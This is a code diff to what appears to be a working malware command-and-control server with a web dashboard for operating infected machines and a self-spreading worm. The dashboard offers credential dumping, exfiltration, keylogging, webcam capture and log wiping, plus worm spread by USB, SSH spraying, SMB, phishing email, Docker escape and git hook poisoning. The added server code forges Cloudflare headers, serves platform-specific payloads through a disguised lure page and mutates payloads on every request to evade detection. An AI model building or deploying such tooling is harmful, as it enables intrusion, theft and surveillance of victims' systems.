-      <button class="btn r" type="submit" name="aid" value="__ALL__">&#x25BA; BROADCAST ALL</button>
-    </form>
-    <div class="qrow"><span class="ql">Recon</span>
-      <a class="qb d" href="/q?aid={fa}&cmd=RECON">RECON</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=SYSINFO">SYSINFO</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=NETWORK">NETWORK</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=DRIVES">DRIVES</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=whoami">whoami</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=id">id</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=hostname">hostname</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=uname+-a">uname</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=ifconfig">ifconfig</a>
-    </div>
-    <div class="qrow"><span class="ql">Post-Ex</span>
-      <a class="qb y" href="/q?aid={fa}&cmd=PERSIST">PERSIST</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=PRIVESC">PRIVESC</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=HASHDUMP">HASHDUMP</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=SSHKEYS">SSHKEYS</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=BROWSERS">BROWSERS</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=EXFIL">EXFIL</a>
-      <a class="qb y" href="/q?aid={fa}&cmd=CLEAN">CLEAN LOGS</a>
-    </div>
-    <div class="qrow"><span class="ql">Spread</span>
-      <a class="qb p" href="/q?aid={fa}&cmd=SPREAD">USB SPREAD</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=SSH_TARGETS">SSH TARGETS</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=NET_SCAN">NET SCAN</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=SSH_SPRAY">SSH SPRAY</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=SMB_SCAN">SMB SCAN</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=NET_MOUNTS">NET MOUNTS</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=EMAIL_SPREAD">EMAIL SPREAD</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=GIT_POISON">GIT POISON</a>
-      <a class="qb p" href="/q?aid={fa}&cmd=DOCKER_ESCAPE">DOCKER ESCAPE</a>
-    </div>
-    <div class="qrow"><span class="ql">Capture</span>
-      <a class="qb g" href="/q?aid={fa}&cmd=SCREENSHOT">SCREENSHOT</a>
-      <a class="qb g" href="/q?aid={fa}&cmd=WEBCAM">WEBCAM</a>
-      <a class="qb g" href="/q?aid={fa}&cmd=CLIPBOARD">CLIPBOARD</a>
-      <a class="qb g" href="/q?aid={fa}&cmd=KEYLOG_START">KEYLOG START</a>
-      <a class="qb g" href="/q?aid={fa}&cmd=KEYLOG_DUMP">KEYLOG DUMP</a>
-    </div>
-    <div class="qrow"><span class="ql">JS Only</span>
-      <a class="qb d" href="/q?aid={fa}&cmd=document.cookie">cookies</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=JSON.stringify(Object.keys(localStorage))">localStorage</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=navigator.userAgent">UA</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=location.href">URL</a>
-      <a class="qb d" href="/q?aid={fa}&cmd=GEOLOC">GEOLOC</a>
-      <a class="qb r" href="/q?aid={fa}&cmd=SELFDESTRUCT">&#x2620; DESTROY</a>
-    </div>
-  </div>
+<div class="pane" id="p-out">
+<div class="tbar"><a class="qa r" href="/agent/clear_output?aid=__ALL__" onclick="return confirm('Clear all output?')">&#x1F5D1; Clear All Output</a></div>
+{ou}
 </div>
-
-<!-- OUTPUT TAB -->
-<div class="tab" id="tab-output">
-  <div class="sh"><span class="ic">&#x1F5A5;</span>AGENT OUTPUT</div>
-  <div class="terminal">{ou}</div>
+<div class="pane" id="p-creds">
+<div class="tbar"><a class="qa r" href="/creds/clear" onclick="return confirm('Delete all credentials?')">&#x1F5D1; Clear All Credentials</a></div>
+{cr}
 </div>
-
-<!-- CREDS TAB -->
-<div class="tab" id="tab-creds">
-  <div class="sh"><span class="ic">&#x1F511;</span>CAPTURED CREDENTIALS<span class="badge-count">{cc} total</span></div>
-  {cr}
+<div class="pane" id="p-loot">
+<div class="tbar"><a class="qa r" href="/loot/clear" onclick="return confirm('Delete ALL loot files?')">&#x1F5D1; Clear All Loot</a></div>
+<div class="lg">{lg}</div>
 </div>
-
-<!-- LOOT TAB -->
-<div class="tab" id="tab-loot">
-  <div class="sh"><span class="ic">&#x1F4E6;</span>LOOT GALLERY<span class="badge-count">{lc} files</span></div>
-  <div class="loot-grid">{lg}</div>
+<div class="pane" id="p-wf">{wf}</div>
+<div class="pane" id="p-wctl">
+<div class="box"><label>Target Worm</label><div class="row"><select id="wsel" onchange="SW(this.value)">{worm_opts}</select></div></div>
+<div class="box"><label>Send Worm Command</label>
+<form method="POST" action="/cmd" onsubmit="document.getElementById('wah').value=_waid">
+<input type="hidden" name="aid" id="wah" value="{fw}">
+<div class="row"><input type="text" name="cmd" placeholder="WORM_STATUS | WORM_PAUSE | WORM_SPREAD_NOW...">
+<button class="btn bp" type="submit">&#x25BA; Send</button>
+<button class="btn ba" type="submit" onclick="document.getElementById('wah').value='__ALL_WORMS__'">&#x1F9EC; ALL WORMS</button>
+</div></form></div>
+<div class="qa-sec"><div class="qa-lbl">Flow Control</div><div class="qa-row">
+<a class="qa g" onclick="W('WORM_STATUS')">STATUS</a><a class="qa" onclick="W('WORM_PAUSE')">PAUSE</a>
+<a class="qa g" onclick="W('WORM_RESUME')">RESUME</a><a class="qa r" onclick="W('WORM_STOP_SPREAD')">STOP SPREAD</a>
+<a class="qa g" onclick="W('WORM_START_SPREAD')">START SPREAD</a><a class="qa y" onclick="W('WORM_SPREAD_NOW')">SPREAD NOW</a>
+<a class="qa" onclick="W('WORM_LIST_TARGETS')">LIST TARGETS</a><a class="qa" onclick="W('WORM_CLEAR_LOG')">CLEAR LOG</a>
+<a class="qa" onclick="W('WORM_CLEAR_SKIP')">CLEAR SKIP</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Vector Switches</div>
+<table style="width:auto">
+<tr><th>Vector</th><th>ON</th><th>OFF</th></tr>
+<tr><td>USB</td><td><a class="qa g" onclick="W('WORM_USB_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_USB_OFF')">OFF</a></td></tr>
+<tr><td>SSH Keys</td><td><a class="qa g" onclick="W('WORM_SSH_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SSH_OFF')">OFF</a></td></tr>
+<tr><td>SSH Spray</td><td><a class="qa g" onclick="W('WORM_SPRAY_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SPRAY_OFF')">OFF</a></td></tr>
+<tr><td>SMB</td><td><a class="qa g" onclick="W('WORM_SMB_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_SMB_OFF')">OFF</a></td></tr>
+<tr><td>Email</td><td><a class="qa g" onclick="W('WORM_EMAIL_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_EMAIL_OFF')">OFF</a></td></tr>
+<tr><td>Net Mounts</td><td><a class="qa g" onclick="W('WORM_NETMOUNT_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_NETMOUNT_OFF')">OFF</a></td></tr>
+<tr><td>Docker</td><td><a class="qa g" onclick="W('WORM_DOCKER_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_DOCKER_OFF')">OFF</a></td></tr>
+<tr><td>Git Hooks</td><td><a class="qa g" onclick="W('WORM_GIT_ON')">ON</a></td><td><a class="qa r" onclick="W('WORM_GIT_OFF')">OFF</a></td></tr>
+</table></div>
 </div>
-
-<!-- WORM FAMILY TAB -->
-<div class="tab" id="tab-family">
-  <div class="sh"><span class="ic">&#x1F9A0;</span>WORM FAMILY
-    <span class="badge-count" style="background:rgba(255,0,170,.1);color:#f0a;border-color:rgba(255,0,170,.3)">{wc} total / {wo} online</span>
-  </div>
-  <div style="background:rgba(255,0,170,.04);border:1px solid rgba(255,0,170,.1);border-radius:4px;padding:8px 14px;margin-bottom:14px;font-size:11px;color:var(--dim)">
-    Worm agents are identified by IDs starting with <b style="color:#f0a">w</b>.
-    Each card shows live spread activity — auto-refreshes every 8s. Click <b style="color:var(--g)">STATUS</b> on any worm for full state.
-  </div>
-  {wf}
-</div>
-
-<!-- WORM CONTROL TAB -->
-<div class="tab" id="tab-worm">
-  <div class="sh"><span class="ic">&#x2699;</span>WORM REMOTE CONTROL</div>
-
-  <div style="background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap">
-    <span style="color:var(--dim);font-size:10px;letter-spacing:1px;text-transform:uppercase">Target worm</span>
-    <select id="worm-sel" style="background:var(--bg);color:#f0a;border:1px solid rgba(255,0,170,.3);padding:6px 10px;font-family:monospace;font-size:12px;border-radius:3px;outline:none"
-      onchange="setWormAid(this.value)">{worm_opts}</select>
-    <span style="color:var(--dim);font-size:10px">Commands go to this worm. Results appear in <b style="color:var(--g)">Output</b> tab.</span>
-  </div>
-
-  <!-- Master control -->
-  <div style="margin-bottom:10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; MASTER CONTROL</div>
-  <div class="wc-section">
-    <div class="wc-row">
-      <a class="wb g" href="/q?aid={fw}&cmd=WORM_STATUS" title="Dump full state: all flags, skip list, spread log, C2 URL, poll interval">&#x2139; STATUS</a>
-      <a class="wb g" href="/q?aid={fw}&cmd=WORM_RESUME" title="Resume spreading after pause — clears paused flag, enables spreading">&#x25B6; RESUME</a>
-      <a class="wb y" href="/q?aid={fw}&cmd=WORM_PAUSE" title="Freeze all spreading threads. Agent still polls C2 every 5s so you can resume instantly">&#x23F8; PAUSE</a>
-      <a class="wb g" href="/q?aid={fw}&cmd=WORM_START_SPREAD" title="Enable master spreading flag — all vectors active">&#x25B6;&#x25B6; START ALL</a>
-      <a class="wb r" href="/q?aid={fw}&cmd=WORM_STOP_SPREAD" title="Disable master spreading flag — all vectors stop. Agent still runs and polls C2">&#x23F9; STOP ALL</a>
-      <a class="wb b" href="/q?aid={fw}&cmd=WORM_SPREAD_NOW" title="Force an immediate spread cycle regardless of NET_INTERVAL timer">&#x26A1; SPREAD NOW</a>
-    </div>
-    <div style="color:var(--dim);font-size:10px;margin-top:4px;line-height:1.6">
-      STATUS = dump all flags &nbsp;|&nbsp; PAUSE = freeze threads, keep polling &nbsp;|&nbsp; STOP ALL = master off (agent still runs) &nbsp;|&nbsp; SPREAD NOW = bypass timer
-    </div>
-  </div>
-
-  <!-- Spreading vectors -->
-  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; SPREADING VECTORS</div>
-  <div class="wc-section">
-    <table style="margin:0">
-      <tr>
-        <th style="width:130px">Vector</th>
-        <th>Description</th>
-        <th style="width:120px">Control</th>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F4BE; USB</td>
-        <td style="color:var(--dim)">Auto-infects USB drives when plugged in. Drops LNK lures + fast-deploy VBS + autorun.inf</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_USB_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_USB_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F511; SSH Keys</td>
-        <td style="color:var(--dim)">Spread via harvested SSH keys to known_hosts targets + /24 network scan</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SSH_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SSH_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F4AC; SSH Spray</td>
-        <td style="color:var(--dim)">Password spray with 80 harvested + common passwords against live SSH hosts (needs sshpass)</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SPRAY_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SPRAY_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F5A7; SMB</td>
-        <td style="color:var(--dim)">Write worm to writable Windows shares via smbclient — both anonymous and authenticated</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_SMB_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_SMB_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F4E7; Email</td>
-        <td style="color:var(--dim)">Harvest contacts from Thunderbird/Outlook/mutt and send phishing with worm attached</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_EMAIL_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_EMAIL_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F4C1; Net Mounts</td>
-        <td style="color:var(--dim)">Infect CIFS/NFS network mounts already mounted on victim — scans /proc/mounts</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_NETMOUNT_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_NETMOUNT_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F433; Docker</td>
-        <td style="color:var(--dim)">Escape Docker container via /proc/1/root write + privileged device mount to infect host</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_DOCKER_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_DOCKER_OFF">OFF</a>
-        </td>
-      </tr>
-      <tr>
-        <td style="color:var(--g)">&#x1F527; Git Hooks</td>
-        <td style="color:var(--dim)">Inject post-commit hooks into local git repos — fires on every developer commit</td>
-        <td>
-          <a class="wb g" href="/q?aid={fw}&cmd=WORM_GIT_ON">ON</a>
-          <a class="wb r" href="/q?aid={fw}&cmd=WORM_GIT_OFF">OFF</a>
-        </td>
-      </tr>
-    </table>
-  </div>
-
-  <!-- Target management -->
-  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; TARGET MANAGEMENT</div>
-  <div class="wc-section">
-    <div class="wc-row">
-      <a class="wb w" href="/q?aid={fw}&cmd=WORM_LIST_TARGETS" title="Show full spread log (already-infected) and skip list">LIST TARGETS</a>
-      <a class="wb y" href="/q?aid={fw}&cmd=WORM_CLEAR_LOG" title="Clear the spread log — worm will re-attempt all previously visited targets">CLEAR SPREAD LOG</a>
-      <a class="wb y" href="/q?aid={fw}&cmd=WORM_CLEAR_SKIP" title="Remove all entries from the skip list">CLEAR SKIP LIST</a>
-      <span style="color:var(--dim);font-size:10px;margin-left:8px">spread log = already infected &nbsp;|&nbsp; skip list = permanently blocked hosts</span>
-    </div>
-    <div class="wc-row" style="margin-top:10px">
-      <span class="wc-label">Skip host</span>
-      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
-        <input type="hidden" name="aid" value="{fw}">
-        <input class="wcinp" style="width:180px" type="text" name="cmd" placeholder="WORM_SKIP 192.168.1.5">
-        <button class="wb w" type="submit">ADD TO SKIP</button>
-      </form>
-      <span style="color:var(--dim);font-size:10px">Permanently block a host — worm will never attempt it again</span>
-    </div>
-  </div>
-
-  <!-- Config -->
-  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; RUNTIME CONFIG</div>
-  <div class="wc-section">
-    <div class="wc-row">
-      <span class="wc-label">Poll interval</span>
-      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
-        <input type="hidden" name="aid" value="{fw}">
-        <input class="wcinp" style="width:200px" type="text" name="cmd" placeholder="WORM_SET_INTERVAL 30">
-        <button class="wb w" type="submit">SET</button>
-      </form>
-      <span style="color:var(--dim);font-size:10px">Seconds between C2 polls (default 8-20s jittered). Min 3s.</span>
-    </div>
-    <div class="wc-row" style="margin-top:10px">
-      <span class="wc-label">C2 URL</span>
-      <form method="GET" action="/q" style="display:inline-flex;gap:6px;align-items:center">
-        <input type="hidden" name="aid" value="{fw}">
-        <input class="wcinp" style="width:280px" type="text" name="cmd" placeholder="WORM_SET_C2 https://new-tunnel.trycloudflare.com">
-        <button class="wb w" type="submit">UPDATE</button>
-      </form>
-      <span style="color:var(--dim);font-size:10px">Hot-swap C2 URL without restarting the worm</span>
-    </div>
-  </div>
-
-  <!-- Command reference -->
-  <div style="margin:14px 0 10px;color:var(--b);font-size:9px;letter-spacing:2px;text-transform:uppercase">&#x25CF; FULL COMMAND REFERENCE</div>
-  <div style="background:var(--bg2);border:1px solid var(--bd);border-radius:4px;padding:12px;font-size:11px">
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px 24px;line-height:1.9">
-      <div><span style="color:var(--g)">WORM_STATUS</span> <span style="color:var(--dim)">— dump all state flags + skip/spread lists</span></div>
-      <div><span style="color:var(--g)">WORM_PAUSE</span> <span style="color:var(--dim)">— freeze all threads, keep polling (5s)</span></div>
-      <div><span style="color:var(--g)">WORM_RESUME</span> <span style="color:var(--dim)">— unfreeze everything</span></div>
-      <div><span style="color:var(--g)">WORM_STOP_SPREAD</span> <span style="color:var(--dim)">— master off (agent still runs)</span></div>
-      <div><span style="color:var(--g)">WORM_START_SPREAD</span> <span style="color:var(--dim)">— master on</span></div>
-      <div><span style="color:var(--g)">WORM_SPREAD_NOW</span> <span style="color:var(--dim)">— force immediate cycle</span></div>
-      <div><span style="color:var(--y)">WORM_USB_ON / OFF</span> <span style="color:var(--dim)">— USB drive infection</span></div>
-      <div><span style="color:var(--y)">WORM_SSH_ON / OFF</span> <span style="color:var(--dim)">— SSH key spread + spray</span></div>
-      <div><span style="color:var(--y)">WORM_SMB_ON / OFF</span> <span style="color:var(--dim)">— SMB share infection</span></div>
-      <div><span style="color:var(--y)">WORM_EMAIL_ON / OFF</span> <span style="color:var(--dim)">— email phishing spread</span></div>
-      <div><span style="color:var(--y)">WORM_NETMOUNT_ON / OFF</span> <span style="color:var(--dim)">— network mount infection</span></div>
-      <div><span style="color:var(--y)">WORM_DOCKER_ON / OFF</span> <span style="color:var(--dim)">— Docker escape vector</span></div>
-      <div><span style="color:var(--y)">WORM_GIT_ON / OFF</span> <span style="color:var(--dim)">— git hook poisoning</span></div>
-      <div><span style="color:var(--b)">WORM_SKIP &lt;host&gt;</span> <span style="color:var(--dim)">— add IP/hostname to skip list</span></div>
-      <div><span style="color:var(--b)">WORM_CLEAR_SKIP</span> <span style="color:var(--dim)">— empty the skip list</span></div>
-      <div><span style="color:var(--b)">WORM_CLEAR_LOG</span> <span style="color:var(--dim)">— forget all spread history</span></div>
-      <div><span style="color:var(--b)">WORM_LIST_TARGETS</span> <span style="color:var(--dim)">— show spread log + skip list</span></div>
-      <div><span style="color:var(--b)">WORM_SET_INTERVAL &lt;n&gt;</span> <span style="color:var(--dim)">— poll interval in seconds</span></div>
-      <div><span style="color:var(--b)">WORM_SET_C2 &lt;url&gt;</span> <span style="color:var(--dim)">— hot-swap C2 URL</span></div>
-    </div>
-  </div>
-</div>
-
-</div><!-- /content -->
-</div><!-- /wrap -->
-
-<!-- Lightbox -->
-<div id="lb" onclick="this.classList.remove('show')"><img id="lb-img" src=""></div>
-
+</div></div>
 <script>
-var TABS=['agents','cmd','output','creds','loot','family','worm'];
-// ── Tab persistence ──────────────────────────────────────────────
-var active=sessionStorage.getItem('c2tab')||'agents';
-function showTab(t){{
-  TABS.forEach(function(id){{
-    document.getElementById('tab-'+id).classList.remove('active');
-    document.getElementById('nav-'+id).classList.remove('active');
-  }});
-  document.getElementById('tab-'+t).classList.add('active');
-  document.getElementById('nav-'+t).classList.add('active');
-  active=t; sessionStorage.setItem('c2tab',t);
+var _aid=sessionStorage.getItem('c2aid')||'{fa}';
+var _waid=sessionStorage.getItem('c2waid')||'{fw}';
+var _tab=sessionStorage.getItem('c2tab')||'agents';
+var _tabs={{'agents':'Agents','cmd':'Command','out':'Output','creds':'Credentials','loot':'Loot Gallery','wf':'Worm Family','wctl':'Worm Control'}};
+function T(t){{
+  document.querySelectorAll('.pane').forEach(function(p){{p.classList.remove('active')}});
+  document.querySelectorAll('.nav').forEach(function(n){{n.classList.remove('active')}});
+  var p=document.getElementById('p-'+t),n=document.getElementById('n-'+t);
+  if(p)p.classList.add('active');if(n)n.classList.add('active');
+  document.getElementById('ttl').textContent=_tabs[t]||t;
+  sessionStorage.setItem('c2tab',t);
 }}
-showTab(active);
-
-// ── Agent selection persistence ──────────────────────────────────
-var selEl=document.querySelector('select[name=aid]');
-if(selEl){{
-  var savedAid=sessionStorage.getItem('c2aid');
-  if(savedAid){{
-    for(var i=0;i<selEl.options.length;i++){{
-      if(selEl.options[i].value===savedAid){{selEl.selectedIndex=i;break;}}
-    }}
-  }}
-  selEl.addEventListener('change',function(){{
-    sessionStorage.setItem('c2aid',this.value);
-    // Highlight matching row
-    document.querySelectorAll('tr[data-aid]').forEach(function(r){{r.classList.remove('sel');}});
-    var row=document.querySelector('tr[data-aid="'+selEl.value+'"]');
-    if(row) row.classList.add('sel');
-  }});
-  // Highlight on load
-  if(savedAid){{
-    var row=document.querySelector('tr[data-aid="'+savedAid+'"]');
-    if(row) row.classList.add('sel');
-  }}
-}}
-
-// ── Update all /q links to use currently selected agent ──────────
-function setAid(aid){{
-  sessionStorage.setItem('c2aid',aid);
-  document.querySelectorAll('a.qb[href*="/q?aid="],a.wb[href*="/q?aid="]').forEach(function(a){{
-    a.href=a.href.replace(/aid=[^&]+/,'aid='+encodeURIComponent(aid));
-  }});
-  if(selEl){{
-    for(var i=0;i<selEl.options.length;i++){{
-      if(selEl.options[i].value===aid){{selEl.selectedIndex=i;break;}}
-    }}
-  }}
-}}
-// Apply saved agent to all quick-links on load
+function SA(v){{_aid=v;sessionStorage.setItem('c2aid',v);var h=document.getElementById('cah');if(h)h.value=v;}}
+function SW(v){{_waid=v;sessionStorage.setItem('c2waid',v);var h=document.getElementById('wah');if(h)h.value=v;}}
+function Q(c){{location='/q?aid='+encodeURIComponent(_aid)+'&cmd='+encodeURIComponent(c);}}
+function W(c){{location='/q?aid='+encodeURIComponent(_waid)+'&cmd='+encodeURIComponent(c);}}
 (function(){{
-  var aid=sessionStorage.getItem('c2aid');
-  if(aid&&aid!=='__ALL__') setAid(aid);
-}})();
-
-// ── Click agent row → select + go to cmd ────────────────────────
-document.querySelectorAll('tr[data-aid]').forEach(function(row){{
-  row.addEventListener('click',function(){{
-    var aid=this.dataset.aid;
-    document.querySelectorAll('tr[data-aid]').forEach(function(r){{r.classList.remove('sel');}});
-    this.classList.add('sel');
-    setAid(aid);
-    showTab('cmd');
+  T(_tab);
+  var cs=document.getElementById('csel');
+  if(cs)for(var i=0;i<cs.options.length;i++)if(cs.options[i].value==_aid){{cs.selectedIndex=i;break;}}
+  var h=document.getElementById('cah');if(h)h.value=_aid;
+  var ws=document.getElementById('wsel');
+  if(ws)for(var i=0;i<ws.options.length;i++)if(ws.options[i].value==_waid){{ws.selectedIndex=i;break;}}
+  var wh=document.getElementById('wah');if(wh)wh.value=_waid;
+  document.querySelectorAll('#agt tr[data-aid]').forEach(function(r){{
+    if(r.getAttribute('data-aid')==_aid)r.classList.add('sel');
+    r.style.cursor='pointer';
+    r.onclick=function(){{
+      SA(this.getAttribute('data-aid'));
+      document.querySelectorAll('#agt tr').forEach(function(x){{x.classList.remove('sel')}});
+      this.classList.add('sel');T('cmd');
+    }};
   }});
-}});
-
-// ── Worm selector ────────────────────────────────────────────────
-function setWormAid(aid){{
-  if(!aid) return;
-  sessionStorage.setItem('c2waid',aid);
-  document.querySelectorAll('#tab-worm a[href*="/q?aid="]').forEach(function(a){{
-    a.href=a.href.replace(/aid=[^&]+/,'aid='+encodeURIComponent(aid));
-  }});
-  document.querySelectorAll('#tab-worm input[name="aid"]').forEach(function(i){{i.value=aid;}});
-}}
-(function(){{
-  var sel=document.getElementById('worm-sel');
-  if(!sel) return;
-  var saved=sessionStorage.getItem('c2waid');
-  if(saved){{for(var i=0;i<sel.options.length;i++){{if(sel.options[i].value===saved){{sel.selectedIndex=i;break;}}}}}}
-  setWormAid(sel.value);
 }})();
-
-// ── Auto-refresh ─────────────────────────────────────────────────
-setTimeout(function(){{location.reload();}},8000);
-
-// ── Lightbox ─────────────────────────────────────────────────────
-function openLB(src){{document.getElementById('lb-img').src=src;document.getElementById('lb').classList.add('show');}}
-document.querySelectorAll('.eimg,.loot-card img').forEach(function(img){{
-  img.addEventListener('click',function(){{openLB(this.src);}});
-}});
+setTimeout(function(){{location.reload()}},5000);
 </script>
 </body></html>"""
 
@@ -977,10 +702,24 @@ h1{{color:#0ff;margin-bottom:12px;font-size:15px}}
 
 class H(BaseHTTPRequestHandler):
     def log_message(self,*a): pass
+
+    def _cdn_headers(self):
+        """Inject Cloudflare CDN-mimicking headers so traffic looks like a CDN response."""
+        ray_id = ''.join(random.choices('0123456789abcdef', k=16))
+        self.send_header("Server", "cloudflare")
+        self.send_header("CF-RAY", f"{ray_id}-AMS")
+        self.send_header("CF-Cache-Status", random.choice(["HIT","MISS","EXPIRED"]))
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("Vary", "Accept-Encoding")
+        self.send_header("Cache-Control", "public, max-age=14400")
+        self.send_header("Age", str(random.randint(0, 3600)))
+
     def _cors(self):
         self.send_header("Access-Control-Allow-Origin","*")
         self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS")
         self.send_header("Access-Control-Allow-Headers","Content-Type,X-Requested-With")
+        self._cdn_headers()
+
     def do_OPTIONS(self): self.send_response(204);self._cors();self.end_headers()
 
     def do_GET(self):
@@ -1022,17 +761,91 @@ class H(BaseHTTPRequestHandler):
                 else: self._send("REGISTER")
             return
 
+        # ── Clean lure endpoint — URL looks like /docs, /update, etc. ──
+        if path == LURE_PATH:
+            ua = self.headers.get("User-Agent","").lower()
+            # Pick payload by platform
+            if "windows" in ua:
+                # Prefer HTA (runs without PowerShell consent prompt)
+                hta_files = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(".hta")]
+                fname = hta_files[0] if hta_files else "worm_agent.ps1"
+            elif "mac" in ua or "darwin" in ua:
+                fname = "agent_http.py"
+            else:
+                fname = "agent_http.py"
+            fpath = os.path.join(PAYLOAD_DIR, fname)
+            if os.path.exists(fpath):
+                with open(fpath,"rb") as f: data=f.read()
+                ct = "application/hta" if fname.endswith(".hta") else "application/octet-stream"
+                self.send_response(200)
+                self.send_header("Content-Type", ct)
+                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
+                self.send_header("Content-Length", len(data))
+                self._cors(); self.end_headers()
+                self.wfile.write(data)
+            else:
+                # Fallback: serve a redirect page that auto-downloads
+                html=(f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+                      f"<title>{LURE_TITLE}</title>"
+                      f"<style>body{{font-family:Arial,sans-serif;text-align:center;padding:60px;background:#f9f9f9}}"
+                      f"h2{{color:#1a73e8}}</style></head><body>"
+                      f"<h2>&#128274; {LURE_TITLE}</h2>"
+                      f"<p>Preparing your download...</p>"
+                      f"<p style='color:#888;font-size:13px'>If download does not start automatically, "
+                      f"<a href='/download/worm_agent.ps1'>click here</a>.</p>"
+                      f"<script>setTimeout(function(){{window.location='/download/worm_agent.ps1'}},1500)</script>"
+                      f"</body></html>")
+                self._html(html)
+            return
+
         if path.startswith("/download/"):
             fname=os.path.basename(path[10:]); fpath=os.path.join(PAYLOAD_DIR,fname)
             if os.path.exists(fpath):
-                with open(fpath,"rb") as f: data=f.read()
-                ct="text/plain" if fname.endswith((".py",".ps1",".sh",".vbs",".bat",".js")) else "application/octet-stream"
+                # Per-request polymorphic mutation for PS1 and Python payloads
+                data = _poly_mutate(fpath)
+                # CDN-disguised content type: serve as application/javascript (looks like a CDN script)
+                if fname.endswith((".ps1",".py",".sh",".bat",".vbs")):
+                    ct = "application/javascript"
+                    cdn_name = fname.replace(".ps1","_bundle.js").replace(".py","_bundle.js").replace(".sh","_bundle.js")
+                else:
+                    ct, _ = mimetypes.guess_type(fname)
+                    ct = ct or "application/octet-stream"
+                    cdn_name = fname
                 self.send_response(200); self.send_header("Content-Type",ct)
-                self.send_header("Content-Disposition",f'attachment; filename="{fname}"')
+                self.send_header("Content-Disposition",f'attachment; filename="{cdn_name}"')
                 self.send_header("Content-Length",len(data)); self._cors(); self.end_headers()
                 self.wfile.write(data)
             else: self.send_response(404); self.end_headers()
             return
+
+        # ── CDN-disguised agent routes (/cdn-cgi/apps/*) ──────────────────────
+        # These mirror /agent/* but look like Cloudflare CDN requests
+        if path.startswith("/cdn-cgi/apps/"):
+            qs2 = parse_qs(urlparse(self.path).query)
+            aid = qs2.get("v",[""])[0] or qs2.get("id",[""])[0]
+
+            if "init" in path:
+                # Maps to /agent/register
+                os_v   = unquote_plus(qs2.get("os",[""])[0])
+                hn     = unquote_plus(qs2.get("hostname",[""])[0])
+                un     = unquote_plus(qs2.get("user",[""])[0])
+                atype  = qs2.get("type",["worm"])[0]
+                ts     = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                with threading.Lock():
+                    agents[aid] = {"id":aid,"os":os_v,"hostname":hn,"user":un,"type":atype,"first_seen":ts,"last_seen":ts,"alive":True}
+                _log(f"[CDN-REG] {aid} os={os_v} host={hn} user={un}")
+                resp = _comm_enc("OK", aid) if aid else "OK"
+                self._send(resp); return
+
+            if "sync" in path:
+                # Maps to /agent/poll
